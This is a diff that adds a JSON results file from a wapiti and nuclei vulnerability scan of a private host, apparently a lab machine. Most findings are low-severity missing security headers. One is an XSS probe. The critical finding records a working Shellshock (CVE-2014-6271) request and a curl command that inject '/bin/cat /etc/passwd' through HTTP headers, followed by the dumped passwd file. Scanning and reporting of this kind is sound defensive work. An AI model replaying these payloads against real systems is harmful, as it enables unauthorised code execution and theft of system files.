@@ -1,0 +1,159 @@
+{
+  "target": "10.49.163.151",
+  "startedAt": "2026-04-29T18:20:54.815321",
+  "finishedAt": "2026-04-29T18:20:54.815636",
+  "tools": [
+    "wapiti",
+    "nuclei"
+  ],
+  "findings": [
+    {
+      "id": "wapiti-Content Security Policy Configuration-0",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://10.49.163.151/cgi-bin",
+      "endpoint": "/cgi-bin",
+      "fullUrl": "/cgi-bin",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/cgi-bin\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-1",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/cgi-bin",
+      "fullUrl": "/cgi-bin",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/cgi-bin\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-2",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/cgi-bin",
+      "fullUrl": "/cgi-bin",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/cgi-bin\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-3",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/cgi-bin",
+      "fullUrl": "/cgi-bin",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/cgi-bin\""
+    },
+    {
+      "id": "wapiti-Inconsistent Redirection-4",
+      "tool": "wapiti",
+      "category": "Inconsistent Redirection",
+      "severity": "low",
+      "title": "Inconsistent Redirection",
+      "description": "3xx redirection contains unexpected HTML body (links/forms)",
+      "endpoint": "/cgi-bin",
+      "fullUrl": "/cgi-bin",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INFO-05"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INFO-05"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/cgi-bin\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-5",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "JavaScript protocol injection in URL path: http://10.49.163.151/javascript:alert(1)",
+      "endpoint": "/javascript:alert(1)",
+      "fullUrl": "/javascript:alert(1)",
+      "method": "",
+      "parameter": "URL path",
+      "evidence": "URL path",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://10.49.163.151/javascript:alert(1)\""
+    },
+    {
+      "id": "nuclei-cve-6",
+      "tool": "nuclei",
+      "category": "CVE",
+      "severity": "critical",
+      "title": "ShellShock - Remote Code Execution",
+      "description": "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.",
+      "impact": "Remote code execution can lead to unauthorized access, data theft, and system compromise.\n",
+      "endpoint": "http://10.49.163.151/cgi-bin/test.cgi",
+      "fullUrl": "http://10.49.163.151/cgi-bin/test.cgi",
+      "method": "GET",
+      "cve": "cve-2014-6271",
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: 10.49.163.151\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\r\nReferer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\r\nShellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html\r\nDate: Wed, 29 Apr 2026 09:20:08 GMT\r\nServer: Apache/2.4.7 (Ubuntu)\r\nVary: Accept-Encoding\r\n\r\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmessagebus:x:102:105::/var/run/dbus:/bin/false\nryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' 'http://10.49.163.151/cgi-bin/test.cgi'",
+      "ip": "10.49.163.151"
+    }
+  ]
+}
